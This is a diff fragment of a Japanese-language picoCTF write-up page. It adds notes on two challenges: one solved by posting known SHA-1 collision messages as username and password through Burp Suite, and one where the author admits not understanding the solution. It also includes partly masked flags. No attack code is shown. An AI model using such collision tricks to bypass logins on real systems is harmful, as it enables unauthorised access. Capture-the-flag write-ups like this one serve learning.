+			<p>という内容だった</p>
+		</div>
+		<div>
+			<p>内容は異なるがsha1は同じものをユーザー名とパスワードに設定すれば良さそう</p>
+			<p>調べると、</p>
+			<p>Googleが発表したsha1の衝突例<a href="https://shattered.io/">SHAttered</a>があったが、少々長いので他を探すと、</p>
+			<p>GitHubが衝突例<a href="https://sha-mbles.github.io/">SHA-1 is a Shambles</a>があった。</p>
+			<p>Burp Suite Community Edition を用いて</p>
+			<p><code>messageA</code>と<code>messageB</code>をそれぞれ<code>username</code>と<code>pwd</code>に設定しPOSTすると、フラグを入手できた</p>
+		</div>
+		<div><p><code>picoCTF{w3Ll_d3sErV3d_Ch4mp_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>300 points | Pachinko</summary>
-		<div></div>
+		<div>
+			<p><b>なにもわかっていないけどこれでフラグを入手できた</b></p>
+			<img src="/images/0001/pachinko.png" width="450">
+		</div>
+		<div><p><code>picoCTF{p4ch1nk0_f146_0n3_********}</code></p></div>
 	</details>
 	<details class="unsolved"><summary>500 points | Pachinko Revisited</summary>
 		<div></div>
